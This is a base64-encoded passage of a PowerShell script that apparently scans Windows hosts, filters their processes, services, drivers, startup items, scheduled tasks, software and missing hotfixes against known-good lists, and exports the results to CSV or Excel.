lbmQgZWFjaCBkYXRhIGZpbGUgdG8gJHJlc3VsdHMuICAKICAgIGZvcmVhY2ggKCRmaWxlIGluIChHZXQtQ2hpbGRJdGVtICIkVEVNUF9ESVJcIiAtRXhjbHVkZSAiJE91dEZpbGUiLCAiRXJyb3JMb2cuY3N2IiwgIlNjYW5uZWRfSG9zdHMqLmNzdiIgLU5hbWUpKQogICAgewoJCSN3YWl0IGZvciBmaWxlIHRvIHVubG9jawoJCWZvcigkaT0wOyAkaSAtbHQgMTA7ICRpKyspCgkJewoJCQl0cnkgewoJCQkJI29ubHkgYWRkIGxpbmVzIHRoYXQgY29udGFpbiBkYXRhIHRvICRSZXN1bHRzCgkJCQlHZXQtQ29udGVudCAiJFRFTVBfRElSXCRmaWxlIiAtRXJyb3JBY3Rpb24gU3RvcHwgd2hlcmUgeyRffSB8IEFkZC1Db250ZW50ICIkUmVzdWx0cyIgLUVycm9yQWN0aW9uIFN0b3AKCQkJCWJyZWFrCgkJCX0gY2F0Y2ggewoJCQkJc3RhcnQtc2xlZXAgLVNlY29uZHMgMwoJCQl9CgkJfQogICAgfQoJCglGaWx0ZXJEYXRhICRTY2FuQ2hvaWNlCgkKICAgIHJldHVybgp9CgojQ3JlYXRlIGEgY291bnQgb3IgdW5pcXVlIGRhdGEKRnVuY3Rpb24gVW5pcXVlRmlsdGVyIAp7CgkkZGF0YXxncm91cHxTZWxlY3QgY291bnQsbmFtZXwKCQlzb3J0IC1wcm9wZXJ0eSBjb3VudCAtZGVzY2VuZGluZ3wlewoJCSIkKCRfLmNvdW50KSwkKCRfLk5hbWUpIiB9Cn0KCkZ1bmN0aW9uIEZpbHRlckRhdGEKewoJcGFyYW0oJFNjYW5DaG9pY2UpCgkKCSRDb250ZW50ID0gR2V0LUNvbnRlbnQgIiRURU1QX0RJUlwkT3V0RmlsZSIKCXN3aXRjaCgkU2NhbkNob2ljZSkKCXsKCQkxewkKCQkJJGZpbHRlciA9IEdldC1Db250ZW50ICRLbm93bkdvb2QuVXNlckV4ZSB8IFdoZXJleyRffQoJCQkKCQkJI1VuaXF1ZSByZXN1bHRzCgkJCSJDb3VudCxFeGVjdXRhYmxlInxBZGQtQ29udGVudCAkUmVzdWx0c1VuaXF1ZQoJCQkkZGF0YSA9ICgkQ29udGVudHxzZWxlY3QgLXNraXAgMSl8JXskXy5zcGxpdCgiLCIpWzFdfQoJCQlVbmlxdWVGaWx0ZXIgfCBBZGQtQ29udGVudCAkUmVzdWx0c1VuaXF1ZQoJCQkJCgkJCSNGaWx0ZXJlZCBSZXN1bHRzCgkJCWlmKCRmaWx0ZXIpCgkJCXsKCQkJCSJIb3N0IE5hbWUsRXhlY3V0YWJsZSxQYXRoIiB8QWRkLUNvbnRlbnQgJFJlc3VsdHNGaWx0ZXJlZAoJCQkJKCRDb250ZW50fHNlbGVjdCAtc2tpcCAxKXxTZWxlY3QtU3RyaW5nIC1Ob3RNYXRjaCAtU2ltcGxlTWF0Y2ggLVBhdHRlcm4gJGZpbHRlciB8QWRkLUNvbnRlbnQgJFJlc3VsdHNGaWx0ZXJlZAoJCQkJCgkJCQkjVW5pcXVlIGZpbHRlcmVkIHJlc3VsdHMKCQkJCSRkYXRhID0gKEdldC1Db250ZW50ICRSZXN1bHRzRmlsdGVyZWR8c2VsZWN0IC1za2lwIDEpfCV7JF8uc3BsaXQoIiwiKVsxXX0KCQkJCWlmKCRkYXRhKQoJCQkJewoJCQkJCSJDb3VudCxFeGVjdXRhYmxlInxBZGQtQ29udGVudCAkUmVzdWx0c1VuaXFGaWx0CgkJCQkJVW5pcXVlRmlsdGVyIHwgQWRkLUNvbnRlbnQgJFJlc3VsdHNVbmlxRmlsdAkKCQkJCX0KCQkJfQoJCX0KCQkyewoJCQkkZmlsdGVyID0gR2V0LUNvbnRlbnQgJEtub3duR29vZC5VU0IgfCBXaGVyZXskX30gCgkJCQoJCQkjVW5pcXVlIHJlc3VsdHMKCQkJIkNvdW50LFJlZ2lzdHJ5IEtleSJ8QWRkLUNvbnRlbnQgJFJlc3VsdHNVbmlxdWUKCQkJJGRhdGEgPSAoJENvbnRlbnR8c2VsZWN0IC1za2lwIDEpfCV7JF8uc3BsaXQoIiwiKVszXX0KCQkJVW5pcXVlRmlsdGVyIHwgQWRkLUNvbnRlbnQgJFJlc3VsdHNVbmlxdWUKCQkJCgkJCSNGaWx0ZXJlZCBSZXN1bHRzCgkJCWlmKCRmaWx0ZXIpCgkJCXsKCQkJCSJIb3N0IE5hbWUsRGVzY3JpcHRpb24sRnJpZW5kbHkgTmFtZSxMb2NhdGlvbiJ8QWRkLUNvbnRlbnQgJFJlc3VsdHNGaWx0ZXJlZAoJCQkJKCRDb250ZW50fHNlbGVjdCAtc2tpcCAxKXxTZWxlY3QtU3RyaW5nIC1Ob3RNYXRjaCAtU2ltcGxlTWF0Y2ggLVBhdHRlcm4gJGZpbHRlciB8QWRkLUNvbnRlbnQgJFJlc3VsdHNGaWx0ZXJlZAoJCQkJCgkJCQkjVW5pcXVlIGZpbHRlcmVkIHJlc3VsdHMKCQkJCSRkYXRhID0gKEdldC1Db250ZW50ICRSZXN1bHRzRmlsdGVyZWR8c2VsZWN0IC1za2lwIDEpfCV7JF8uc3BsaXQoIiwiKVszXX0KCQkJCWlmKCRkYXRhKQoJCQkJewoJCQkJCSJDb3VudCxFeGVjdXRhYmxlInxBZGQtQ29udGVudCAkUmVzdWx0c1VuaXFGaWx0CgkJCQkJVW5pcXVlRmlsdGVyIHwgQWRkLUNvbnRlbnQgJFJlc3VsdHNVbmlxRmlsdAkKCQkJCX0KCQkJfQkKCQl9CQkJCiAgICAgICAgNHsKCQkJJGZpbHRlciA9IEdldC1Db250ZW50ICRLbm93bkdvb2QuU3RhcnRVcFByb2cgfCBXaGVyZXskX30KCQkJCgkJCSNVbmlxdWUgcmVzdWx0cwoJCQkiQ291bnQsQ29tbWFuZCJ8QWRkLUNvbnRlbnQgJFJlc3VsdHNVbmlxdWUKCQkJJGRhdGEgPSAoJENvbnRlbnR8c2VsZWN0IC1za2lwIDEpfCV7JF8uc3BsaXQoIiwiKVsxXX0KCQkJVW5pcXVlRmlsdGVyIHwgQWRkLUNvbnRlbnQgJFJlc3VsdHNVbmlxdWUKCQkJCgkJCSNGaWx0ZXJlZCBSZXN1bHRzCgkJCWlmKCRmaWx0ZXIpCgkJCXsKCQkJCSJIb3N0IE5hbWUsQ29tbWFuZCxEZXNjcmlwdGlvbixMb2NhdGlvbixVc2VyInxBZGQtQ29udGVudCAkUmVzdWx0c0ZpbHRlcmVkCgkJCQkoJENvbnRlbnR8c2VsZWN0IC1za2lwIDEpfFNlbGVjdC1TdHJpbmcgLU5vdE1hdGNoIC1TaW1wbGVNYXRjaCAtUGF0dGVybiAkZmlsdGVyIHxBZGQtQ29udGVudCAkUmVzdWx0c0ZpbHRlcmVkCgkJCQkKCQkJCSNVbmlxdWUgZmlsdGVyZWQgcmVzdWx0cwoJCQkJJGRhdGEgPSAoR2V0LUNvbnRlbnQgJFJlc3VsdHNGaWx0ZXJlZHxzZWxlY3QgLXNraXAgMSl8JXskXy5zcGxpdCgiLCIpWzFdfQoJCQkJaWYoJGRhdGEpCgkJCQl7CgkJCQkJIkNvdW50LENvbW1hbmQifEFkZC1Db250ZW50ICRSZXN1bHRzVW5pcUZpbHQKCQkJCQlVbmlxdWVGaWx0ZXIgfCBBZGQtQ29udGVudCAkUmVzdWx0c1VuaXFGaWx0CQoJCQkJfQoJCQl9CQkKCQl9CgkJCQogICAgICAgIDV7CgkJCSRmaWx0ZXIgPSBHZXQtQ29udGVudCAkS25vd25Hb29kLlNjaGVkVGFza3MgfCBXaGVyZXskX30KCQkJCgkJCSNVbmlxdWUgcmVzdWx0cwoJCQkiQ291bnQsQ29tbWFuZCJ8QWRkLUNvbnRlbnQgJFJlc3VsdHNVbmlxdWUKCQkJJGRhdGEgPSAoJENvbnRlbnR8c2VsZWN0IC1za2lwIDEpfCV7JF8uc3BsaXQoIiwiKVsxXX0KCQkJVW5pcXVlRmlsdGVyIHwgQWRkLUNvbnRlbnQgJFJlc3VsdHNVbmlxdWUKCQkJCgkJCSNGaWx0ZXJlZCBSZXN1bHRzCgkJCWlmKCRmaWx0ZXIpCgkJCXsKCQkJCSJIb3N0IE5hbWUsQ29tbWFuZCxKb2JJZCxOYW1lLE93bmVyLFByaW9yaXR5InxBZGQtQ29udGVudCAkUmVzdWx0c0ZpbHRlcmVkCgkJCQkoJENvbnRlbnR8c2VsZWN0IC1za2lwIDEpfFNlbGVjdC1TdHJpbmcgLU5vdE1hdGNoIC1TaW1wbGVNYXRjaCAtUGF0dGVybiAkZmlsdGVyIHxBZGQtQ29udGVudCAkUmVzdWx0c0ZpbHRlcmVkCgkJCQkKCQkJCSNVbmlxdWUgZmlsdGVyZWQgcmVzdWx0cwoJCQkJJGRhdGEgPSAoR2V0LUNvbnRlbnQgJFJlc3VsdHNGaWx0ZXJlZHxzZWxlY3QgLXNraXAgMSl8JXskXy5zcGxpdCgiLCIpWzFdfQoJCQkJaWYoJGRhdGEpCgkJCQl7CgkJCQkJIkNvdW50LENvbW1hbmQifEFkZC1Db250ZW50ICRSZXN1bHRzVW5pcUZpbHQKCQkJCQlVbmlxdWVGaWx0ZXIgfCBBZGQtQ29udGVudCAkUmVzdWx0c1VuaXFGaWx0CQoJCQkJfQoJCQl9CQoJCX0JCgkJNnsKCQkJJGZpbHRlciA9IEdldC1Db250ZW50ICRLbm93bkdvb2QuUnVubmluZ1Byb2NzIHwgV2hlcmV7JF99CgkJCQoJCQkjVW5pcXVlIHJlc3VsdHMKCQkJIkNvdW50LEV4ZWN1dGFibGUsUGF0aCJ8QWRkLUNvbnRlbnQgJFJlc3VsdHNVbmlxdWUKCQkJJGRhdGEgPSAoJENvbnRlbnR8c2VsZWN0IC1za2lwIDEpfCV7IiQoJF8uc3BsaXQoIiwiKVsyXSksJCgkXy5zcGxpdCgiLCIpWzFdKSJ9CgkJCVVuaXF1ZUZpbHRlciB8IEFkZC1Db250ZW50ICRSZXN1bHRzVW5pcXVlCgkJCQoJCQkjRmlsdGVyZWQgUmVzdWx0cwoJCQlpZigkZmlsdGVyKQoJCQl7CgkJCQkiSG9zdCBOYW1lLEV4ZWN1dGFibGUgUGF0aCxOYW1lInxBZGQtQ29udGVudCAkUmVzdWx0c0ZpbHRlcmVkCgkJCQkoJENvbnRlbnR8c2VsZWN0IC1za2lwIDEpfFNlbGVjdC1TdHJpbmcgLU5vdE1hdGNoIC1TaW1wbGVNYXRjaCAtUGF0dGVybiAkZmlsdGVyIHxBZGQtQ29udGVudCAkUmVzdWx0c0ZpbHRlcmVkCgkJCQkKCQkJCSNVbmlxdWUgZmlsdGVyZWQgcmVzdWx0cwoJCQkJJGRhdGEgPSAoR2V0LUNvbnRlbnQgJFJlc3VsdHNGaWx0ZXJlZHxzZWxlY3QgLXNraXAgMSl8JXsiJCgkXy5zcGxpdCgiLCIpWzJdKSwkKCRfLnNwbGl0KCIsIilbMV0pIn0KCQkJCWlmKCRkYXRhKQoJCQkJewoJCQkJCSJDb3VudCxFeGVjdXRhYmxlLFBhdGgifEFkZC1Db250ZW50ICRSZXN1bHRzVW5pcUZpbHQKCQkJCQlVbmlxdWVGaWx0ZXIgfCBBZGQtQ29udGVudCAkUmVzdWx0c1VuaXFGaWx0CQoJCQkJfQoJCQl9CgkJfQkJCiAgICAgICAgN3sKCQkJJGZpbHRlciA9IEdldC1Db250ZW50ICRLbm93bkdvb2QuRHJpdmVycyB8IFdoZXJleyRffQoJCQkKCQkJI1VuaXF1ZSByZXN1bHRzCgkJCSJDb3VudCxEcml2ZXIgTmFtZSJ8QWRkLUNvbnRlbnQgJFJlc3VsdHNVbmlxdWUKCQkJJGRhdGEgPSAoJENvbnRlbnR8c2VsZWN0IC1za2lwIDEpfCV7JF8uc3BsaXQoIiwiKVszXX0KCQkJVW5pcXVlRmlsdGVyIHwgQWRkLUNvbnRlbnQgJFJlc3VsdHNVbmlxdWUKCQkJCgkJCSNGaWx0ZXJlZCBSZXN1bHRzCgkJCWlmKCRmaWx0ZXIpCgkJCXsKCQkJCSJIb3N0IE5hbWUsRGVzY3JpcHRpb24sRGlzcGxheU5hbWUsTmFtZSxTdGFydGVkLFN0YXRlLFN0YXR1cyJ8QWRkLUNvbnRlbnQgJFJlc3VsdHNGaWx0ZXJlZAoJCQkJKCRDb250ZW50fHNlbGVjdCAtc2tpcCAxKXxTZWxlY3QtU3RyaW5nIC1Ob3RNYXRjaCAtU2ltcGxlTWF0Y2ggLVBhdHRlcm4gJGZpbHRlciB8QWRkLUNvbnRlbnQgJFJlc3VsdHNGaWx0ZXJlZAoJCQkJCgkJCQkjVW5pcXVlIGZpbHRlcmVkIHJlc3VsdHMKCQkJCSRkYXRhID0gKEdldC1Db250ZW50ICRSZXN1bHRzRmlsdGVyZWR8c2VsZWN0IC1za2lwIDEpfCV7JF8uc3BsaXQoIiwiKVszXX0KCQkJCWlmKCRkYXRhKQoJCQkJewoJCQkJCSJDb3VudCxEcml2ZXIgTmFtZSJ8QWRkLUNvbnRlbnQgJFJlc3VsdHNVbmlxRmlsdAoJCQkJCVVuaXF1ZUZpbHRlciB8IEFkZC1Db250ZW50ICRSZXN1bHRzVW5pcUZpbHQJCgkJCQl9CgkJCX0KCQl9CiAgICAgICAgOHsKCQkJJGZpbHRlciA9IEdldC1Db250ZW50ICRLbm93bkdvb2QuU2VydmljZXMgfCBXaGVyZXskX30KCQkJCgkJCSNVbmlxdWUgcmVzdWx0cwoJCQkiQ291bnQsU2VydmljZSBOYW1lInxBZGQtQ29udGVudCAkUmVzdWx0c1VuaXF1ZQoJCQkkZGF0YSA9ICgkQ29udGVudHxzZWxlY3QgLXNraXAgMSl8JXskXy5zcGxpdCgiLCIpWzFdfQoJCQlVbmlxdWVGaWx0ZXIgfCBBZGQtQ29udGVudCAkUmVzdWx0c1VuaXF1ZQoJCQkKCQkJI0ZpbHRlcmVkIFJlc3VsdHMKCQkJaWYoJGZpbHRlcikKCQkJewoJCQkJIkhvc3QgTmFtZSxOYW1lLFN0YXJ0TW9kZSxTdGF0ZSxTdGF0dXMifEFkZC1Db250ZW50ICRSZXN1bHRzRmlsdGVyZWQKCQkJCSgkQ29udGVudHxzZWxlY3QgLXNraXAgMSl8U2VsZWN0LVN0cmluZyAtTm90TWF0Y2ggLVNpbXBsZU1hdGNoIC1QYXR0ZXJuICRmaWx0ZXIgfEFkZC1Db250ZW50ICRSZXN1bHRzRmlsdGVyZWQKCQkJCQoJCQkJI1VuaXF1ZSBmaWx0ZXJlZCByZXN1bHRzCgkJCQkkZGF0YSA9IChHZXQtQ29udGVudCAkUmVzdWx0c0ZpbHRlcmVkfHNlbGVjdCAtc2tpcCAxKXwleyRfLnNwbGl0KCIsIilbMV19CgkJCQlpZigkZGF0YSkKCQkJCXsKCQkJCQkiQ291bnQsQ29tbWFuZCJ8QWRkLUNvbnRlbnQgJFJlc3VsdHNVbmlxRmlsdAoJCQkJCVVuaXF1ZUZpbHRlciB8IEFkZC1Db250ZW50ICRSZXN1bHRzVW5pcUZpbHQJCgkJCQl9CgkJCX0KCQl9CgkJMTB7CgkJCSRmaWx0ZXIgPSBHZXQtQ29udGVudCAkS25vd25Hb29kLlNvZnR3YXJlIHwgV2hlcmV7JF99CgkJCQoJCQkjVW5pcXVlIHJlc3VsdHMKCQkJIkNvdW50LFNvZnR3YXJlIE5hbWUifEFkZC1Db250ZW50ICRSZXN1bHRzVW5pcXVlCgkJCSRkYXRhID0gKCRDb250ZW50fHNlbGVjdCAtc2tpcCAxKXwleyRfLnNwbGl0KCIsIilbM119CgkJCVVuaXF1ZUZpbHRlciB8IEFkZC1Db250ZW50ICRSZXN1bHRzVW5pcXVlCgkJCQoJCQkjRmlsdGVyZWQgUmVzdWx0cwoJCQlpZigkZmlsdGVyKQoJCQl7CgkJCQkiSG9zdCBOYW1lLEluc3RhbGxEYXRlLEluc3RhbGxMb2NhdGlvbixOYW1lLFZlbmRvcixWZXJzaW9uInxBZGQtQ29udGVudCAkUmVzdWx0c0ZpbHRlcmVkCgkJCQkoJENvbnRlbnR8c2VsZWN0IC1za2lwIDEpfFNlbGVjdC1TdHJpbmcgLU5vdE1hdGNoIC1TaW1wbGVNYXRjaCAtUGF0dGVybiAkZmlsdGVyIHxBZGQtQ29udGVudCAkUmVzdWx0c0ZpbHRlcmVkCgkJCQkKCQkJCSNVbmlxdWUgZmlsdGVyZWQgcmVzdWx0cwoJCQkJJGRhdGEgPSAoR2V0LUNvbnRlbnQgJFJlc3VsdHNGaWx0ZXJlZHxzZWxlY3QgLXNraXAgMSl8JXskXy5zcGxpdCgiLCIpWzNdfQoJCQkJaWYoJGRhdGEpCgkJCQl7CgkJCQkJIkNvdW50LFNvZnR3YXJlIE5hbWUifEFkZC1Db250ZW50ICRSZXN1bHRzVW5pcUZpbHQKCQkJCQlVbmlxdWVGaWx0ZXIgfCBBZGQtQ29udGVudCAkUmVzdWx0c1VuaXFGaWx0CQoJCQkJfQoJCQl9CgkJfQoJCTEzewoJCQkkZmlsdGVyID0gR2V0LUNvbnRlbnQgJEtub3duR29vZC5Ib3RGaXggfCBXaGVyZXskX30KCQkJCgkJCSJDb3VudCxIb3RGaXhJRCJ8QWRkLUNvbnRlbnQgJFJlc3VsdHNVbmlxdWUKCQkJJGRhdGEgPSAoJENvbnRlbnR8c2VsZWN0IC1za2lwIDEpfCV7JF8uc3BsaXQoIiwiKVsyXX0KCQkJVW5pcXVlRmlsdGVyIHwgQWRkLUNvbnRlbnQgJFJlc3VsdHNVbmlxdWUKCQkJCgkJCSNGaWx0ZXJlZCBSZXN1bHRzCgkJCWlmKCRmaWx0ZXIpCgkJCXsKCQkJCSJIb3N0IE5hbWUsT1MgVmVyc2lvbiBOdW1iZXIsTWlzc2luZyBIb3QtRml4InxBZGQtQ29udGVudCAkUmVzdWx0c0ZpbHRlcmVkCgkJCQkKCQkJCSNHZXQgaG9zdHMgbmFtZXMgZnJvbSBob3QgZml4IHNjYW4KCQkJCSRkYXRhID0gKCRDb250ZW50fHNlbGVjdCAtc2tpcCAxKXwleyRfLnNwbGl0KCIsIilbMF19CgkJCQkKCQkJCSNmb3IgZWFjaCBob3N0IG5hbWUgZmluZCBob3QgZml4ZXMgdGhhdCBhcmUgTk9UIGluc3RhbGxlZAoJCQkJVW5pcXVlRmlsdGVyIHwgJXsKCQkJCQkkSG9zdE5hbWUgPSAkXy5zcGxpdCgiLCIpWzFdCgkJCQkJJEhvc3RWZXJzaW9uID0gJHNjcmlwdDpBY3RpdmVDb21wdXRlcnN8JXskX3xzZWxlY3QtU3RyaW5nICRIb3N0TmFtZX0KCQkJCQlpZigkSG9zdFZlcnNpb24pIAoJCQkJCXsKCQkJCQkJJEhvc3RWZXJzaW9uID0gJEhvc3RWZXJzaW9uLnRvc3RyaW5nKCkuc3BsaXQoIiwiKVsyXQoJCQkJCQkkZmlsdGVyIHx3aGVyZXskX318JXsKCQkJCQkJCgkJCQkJCQkjVmVyc2lvbiBpbmNsdWRlZCBpbiBmaWx0ZXIgbGlzdCBzaG91bGQgYmUgbWFqb3IgdmVyc2lvbiAoaS5lLiA2LjEpCgkJCQkJCQlpZigkXy5zcGxpdCgiLCIpLmNvdW50IC1ndCAxKXsKCQkJCQkJCQkkRmlsdGVyVmVyID0gJF8uc3BsaXQoIiwiKVswXQoJCQkJCQkJCSRGaWx0ZXJIb3RGaXggPSAkXy5zcGxpdCgiLCIpWzFdCgkJCQkJCQkJCgkJCQkJCQkJI01ha2Ugc3VyZSBob3N0IE9TIHZlcnNpb24gbWF0Y2hlcyBmaWx0ZXIKCQkJCQkJCQlpZigkSG9zdFZlcnNpb258U2VsZWN0LVN0cmluZyAkRmlsdGVyVmVyKSB7CgkJCQkJCQkJCSNDaGVjayB0byBzZWUgdGhhdCBob3N0IGRvZXMgTk9UIG1hdGNoIHRoZSBIb3RGaXhJRAoJCQkJCQkJCQlpZiAoLW5vdCAoJENvbnRlbnQgfCBTZWxlY3QtU3RyaW5nICRIb3N0TmFtZSB8IFNlbGVjdC1TdHJpbmcgJEZpbHRlckhvdEZpeCkpCgkJCQkJCQkJCXsKCQkJCQkJCQkJCSIkSG9zdE5hbWUsJEhvc3RWZXJzaW9uLCQoJF8uc3BsaXQoIiwiKVsxXSkifEFkZC1Db250ZW50ICRSZXN1bHRzRmlsdGVyZWQKCQkJCQkJCQkJfQoJCQkJCQkJCX0KCQkJCQkJCX0KCQkJCQkJCQoJCQkJCQkJI0ZpbHRlciBpdGVtIGlzIG9ubHkgYSBob3RmaXhJRAoJCQkJCQkJZWxzZSAKCQkJCQkJCXsKCQkJCQkJCQlpZiAoLW5vdCAoJENvbnRlbnQgfCBTZWxlY3QtU3RyaW5nICRIb3N0TmFtZSB8IFNlbGVjdC1TdHJpbmcgIiRfIikpCgkJCQkJCQkJewoJCQkJCQkJCQkiJEhvc3ROYW1lLCRIb3N0VmVyc2lvbiwkXyJ8QWRkLUNvbnRlbnQgJFJlc3VsdHNGaWx0ZXJlZAoJCQkJCQkJCX0KCQkJCQkJCX0KCQkJCQkJfQoJCQkJCX0KCQkJCX0KCQkJfQoJCX0KCQkxNXsKCQkJI1VuaXF1ZSByZXN1bHRzCgkJCSJDb3VudCxBY2NvdW50IE5hbWUifEFkZC1Db250ZW50ICRSZXN1bHRzVW5pcXVlCgkJCSRkYXRhID0gKCRDb250ZW50fHNlbGVjdCAtc2tpcCAxKXwleyRfLnNwbGl0KCIsIilbMV19CgkJCVVuaXF1ZUZpbHRlciB8IEFkZC1Db250ZW50ICRSZXN1bHRzVW5pcXVlCgkJfQoJCTEwNHsKCQkJJGRhdGEgPSAoR2V0LUNvbnRlbnQgIiRURU1QX0RJUlwkT3V0RmlsZSJ8c2VsZWN0IC1za2lwIDEpIHwleyRfLnNwbGl0KCIsIilbMV19CgkJCWlmKCRkYXRhKQoJCQl7CgkJCQkiQ291bnQsRmlsZSBOYW1lInxBZGQtQ29udGVudCAkUmVzdWx0c1VuaXF1ZQoJCQkJVW5pcXVlRmlsdGVyIHwgQWRkLUNvbnRlbnQgJFJlc3VsdHNVbmlxdWUJCgkJCX0KCQl9CgkJMTA1ewoJCQkkZGF0YSA9IChHZXQtQ29udGVudCAiJFRFTVBfRElSXCRPdXRGaWxlInxzZWxlY3QgLXNraXAgMSkgfCV7JF8uc3BsaXQoIiwiKVsxXX0KCQkJaWYoJGRhdGEpCgkJCXsKCQkJCSJDb3VudCxGaWxlIE5hbWUifEFkZC1Db250ZW50ICRSZXN1bHRzVW5pcXVlCgkJCQlVbmlxdWVGaWx0ZXIgfCBBZGQtQ29udGVudCAkUmVzdWx0c1VuaXF1ZQkKCQkJfQoJCX0KCX0KCQoJJENvbnZlcnRGaWxlcyA9ICRFcnJvcnMsICRSZXN1bHRzVW5pcUZpbHQsICRSZXN1bHRzRmlsdGVyZWQsICRSZXN1bHRzVW5pcXVlLCAkUmVzdWx0cyAgIAoJQ29udmVydEZpbGVGb3JtYXQgJENvbnZlcnRGaWxlcwp9CgpGdW5jdGlvbiBSZWxlYXNlLVJlZgp7CglwYXJhbSgkcmVmKQoJCgkoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UmVsZWFzZUNvbU9iamVjdChbU3lzdGVtLl9fQ29tT2JqZWN0XSRyZWYpIC1ndCAwKQoJW1N5c3RlbS5HQ106OkNvbGxlY3QoKQoJW1N5c3RlbS5HQ106OldhaXRGb3JQZW5kaW5nRmluYWxpemVycygpCn0KCkZ1bmN0aW9uIENvbnZlcnRGaWxlRm9ybWF0CnsKCXBhcmFtKCRGaWxlTmFtZXMsICRTY2FubmVkSG9zdHMpCgkKCSNJZiBDU1YganVzdCBtb3ZlIGZpbGVzLiAgTm8gY29udmVyc2lvbiByZXF1aXJlZAoJaWYoJE91dHB1dEZvcm1hdCAtZXEgImNzdiIpCgl7CgkJaWYoJFNjYW5uZWRIb3N0cykKCQl7CgkJCU1vdmUtSXRlbSAiJFRFTVBfRElSXFNjYW5uZWRfSG9zdHMqY3N2IiAiJE9VVF9ESVJcIgoJCX0KCQllbHNlCgkJewoJCQlNb3ZlLUl0ZW0gIiRURU1QX0RJUlwkb3V0ZmlsZSIgIiRPVVRfRElSXCIKCQkJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIEdyZWVuICJEYXRhIGxvY2F0ZWQgYXQgJE9VVF9ESVJcJG91dGZpbGUKCQkiCgkJfQkJCgkJCgkJUmV0dXJuCgl9CgkKCWlmKC1ub3QgJFNjYW5uZWRIb3N0cykgI2Rvbid0IHdyaXRlIGNvbnZlcnRpbmcgZmlsZSBmb3JtYXQgd2hlbiBzY2FubmVkIGhvc3RzIGZpbGUgaXMgY3JlYXRlZAoJewoJCVdyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBZZWxsb3cgIkNvbnZlcnRpbmcgZmlsZSBmb3JtYXQiCgl9CgkKCWlmICgtbm90IChUZXN0LVBhdGggIiRPVVRfRElSXENTViIpKSAjdmVyaWZ5L2NyZWF0ZSBkaXJlY3RvcnkgZm9yIGNvbnZlcnRlZCBDU1YgZmlsZXMKCXsKCQlta2RpciAiJE9VVF9ESVJcQ1NWIiB8T3V0LU51bGwKCX0KCQoJI0NyZWF0ZSBhIG1pY3Jvc29mdCBleGNlbCBvYmplY3QgYW5kIGRlZmF1bHQgdG8gQ1NWIG9uIGZhaWx1cmUKCXRyeSB7CgkJJGV4Y2VsID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IEV4Y2VsLkFwcGxpY2F0aW9uIC1FcnJvckFjdGlvbiBTdG9wCgl9IGNhdGNoIHsKCQlXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgUmVkICJGYWlsZWQgdG8gY3JlYXRlIEV4Y2VsIG9iamVjdC4gIERlZmF1bHRpbmcgdG8gQ1NWIgoJCSRzY3JpcHQ6T3V0cHV0Rm9ybWF0ID0gIkNTViIKCQkKCQlpZigkU2Nhbm5lZEhvc3RzKQoJCXsKCQkJTW92ZS1JdGVtICIkVEVNUF9ESVJcU2Nhbm5lZF9Ib3N0cypjc3YiICIkT1VUX0RJUlwiCgkJfQoJCWVsc2UKCQl7CgkJCU1vdmUtSXRlbSAiJFRFTVBfRElSXCRvdXRmaWxlIiAiJE9VVF9ESVJcIgoJCQlXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4gIkRhdGEgbG9jYXRlZCBhdCAkT1VUX0RJUlwkb3V0ZmlsZSIKCQl9CgkJUmV0dXJuIAoJfQoJCgkjc2V0IGV4Y2VsIHRvIGludmlzaWJsZQoJJGV4Y2VsLlZpc2libGUgPSAkZmFsc2UKCQoJI0FkZCB3b3JrYm9vawoJJHdvcmtib29rID0gJGV4Y2VsLndvcmtib29rcy5BZGQoKQogICAgCgkjUmVtb3ZlIG90aGVyIHdvcmtzaGVldHMKICAgICR3b3JrYm9vay53b3Jrc2hlZXRzLkl0ZW0oMikuZGVsZXRlKCkKICAgCiAgICAjQWZ0ZXIgdGhlIGZpcnN0IHdvcmtzaGVldCBpcyByZW1vdmVkLHRoZSBuZXh0IG9uZSB0YWtlcyBpdHMgcGxhY2UKICAgICR3b3JrYm9vay53b3Jrc2hlZXRzLkl0ZW0oMikuZGVsZXRlKCkgCgkKCSRpPTEKCWZvcmVhY2ggKCRDU1YgaW4gJEZpbGVOYW1lcykKCXsKCQlpZigtbm90IChUZXN0LVBhdGggIiRDU1YiKSl7Y29udGludWV9CgkJJEZpbGUgPSAoR0NJICRDU1YpLkJhc2VOYW1lLnNwbGl0KCIuIilbMF0KCQkKCQkjSWYgbW9yZSB0aGFuIG9uZSBmaWxlLCBjcmVhdGUgYW5vdGhlciB3b3Jrc2hlZXQgZm9yIGVhY2ggZmlsZQogICAgICAgIElmICgkaSAtZ3QgMSkgewogICAgICAgICAgICAkd29ya2Jvb2sud29ya3NoZWV0cy5BZGQoKSB8IE91dC1OdWxsCiAgICAgICAgfQoJCQogICAgICAgICNVc2UgdGhlIGZpcnN0IHdvcmtzaGVldCBpbiB0aGUgd29ya2Jvb2sgKGFsc28gdGhlIG5ld2VzdCBjcmVhdGVkIHdvcmtzaGVldCBpcyBhbHdheXMgMSkKICAgICAgICAkd29ya3NoZWV0ID0gJHdvcmtib29rLndvcmtzaGVldHMuSXRlbSgxKQogICAgICAKCQkjQWRkIG5hbWUgb2YgQ1NWIGFzIHdvcmtzaGVldCBuYW1lCiAgICAgICAgJHdvcmtzaGVldC5uYW1lID0gJCgkRmlsZS5zcGxpdCgiMDEyIilbMF0pCgogICAgICAgICNEZWZpbmUgdGhlIGNvbm5lY3Rpb24gc3RyaW5nIGFuZCB3aGVyZSB0aGUgZGF0YSBpcyBzdXBwb3NlZCB0byBnbwoJCSRUeHRDb25uZWN0b3IgPSAoIlRFWFQ7IiArIChHZXQtSXRlbSAkQ1NWKS5GdWxsTmFtZSkKCQkkQ2VsbFJlZiA9ICR3b3Jrc2hlZXQuUmFuZ2UoIkExIikKCQkKCQkjQnVpbGQsIHVzZSBhbmQgcmVtb3ZlIHRoZSB0ZXh0IGZpbGUgY29ubmVjdG9yCgkJJENvbm5lY3RvciA9ICR3b3Jrc2hlZXQuUXVlcnlUYWJsZXMuYWRkKCRUeHRDb25uZWN0b3IsJENlbGxSZWYpCgkJJHdvcmtzaGVldC5RdWVyeVRhYmxlcy5pdGVtKCRDb25uZWN0b3IubmFtZSkuVGV4dEZpbGVDb21tYURlbGltaXRlciA9ICRUcnVlCgkJJHdvcmtzaGVldC5RdWVyeVRhYmxlcy5pdGVtKCRDb25uZWN0b